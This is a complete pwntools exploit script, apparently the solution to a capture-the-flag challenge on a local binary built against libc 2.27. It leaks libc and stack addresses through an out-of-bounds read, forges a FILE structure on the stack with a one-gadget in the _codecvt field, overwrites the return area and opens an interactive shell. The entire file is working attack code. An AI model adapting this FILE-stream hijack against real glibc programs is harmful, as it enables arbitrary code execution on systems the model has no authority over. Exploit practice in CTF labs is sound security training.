from pwn import *

libc = ELF('../src/server/libc-2.27.so')

LOCAL = 0
if LOCAL:
    p = process('../src/server/chall')
else:
    p = remote('localhost', 9999)

# leak libc
p.recvuntil(b'> ')
p.send(b'1')
p.recvuntil(b'> ')
p.send(b'A' * 8)
p.recvuntil(b'> ')
p.send(b'100')
libc_leak = p.recvuntil(b'Thanks Boss :D')[45:-15]
libc_leak = int.from_bytes(libc_leak, 'little')
print('libc_leak:', hex(libc_leak))

# leak environ
array_offset = 0x6020e0
environ_from_leak = 0x3ad8e8
idx_environ = (libc_leak + environ_from_leak - array_offset) // 32
print('environ:', hex(libc_leak + environ_from_leak))
print('environ nearby address:', hex(idx_environ * 32 + array_offset))
p.recvuntil(b'> ')
p.send(b'2')
p.recvuntil(b'\n')
p.send(str(idx_environ).encode())
res = p.recvuntil(b'?')
stack_leak = res[32:-25]
stack_leak = int.from_bytes(stack_leak, 'little')
print('stack_leak:', hex(stack_leak))

# create a FILE like struct in stack, and point the filestream there
# write to rbp+8
p.recvuntil(b'> ')
p.send(b'3')
p.recvuntil(b'> ')

payload = b''
payload += b'A' * 8 # padding

payload += p64(0xfbad2480) # _flags

for i in range(6):
    payload += p64(0)

payload += p64(stack_leak-0x110) # _IO_buf_base
payload += p64(stack_leak-0x110+160) # _IO_buf_end

for i in range(4):
    payload += p64(0)

_IO_2_1_stderr_ = libc_leak + 0x3abed0
_IO_file_jumps = libc_leak + 0x3a7af0

payload += p64(_IO_2_1_stderr_) # _IO_2_1_stderr_
payload += p64(1) # _fileno
payload += p64(0)
payload += p64(0)
payload += p64(array_offset + 0x300) #_lock
payload += b'\xff' * 8 #_offset
payload += p64(libc_leak + 0xec82) #_codecvt, one gadget, constraint: [rsp+0x40] == NULL, manually calculated the distance from libc_leak
payload += p64(array_offset + 0x310) #_wide_data
payload += b'\x00' * 6 * 8
payload += p64(_IO_file_jumps)
payload += b'\x00' * (256 - len(payload))
payload += p64(stack_leak - 0x220) # buffer address

print('len(payload):', len(payload))
p.send(payload)
p.interactive()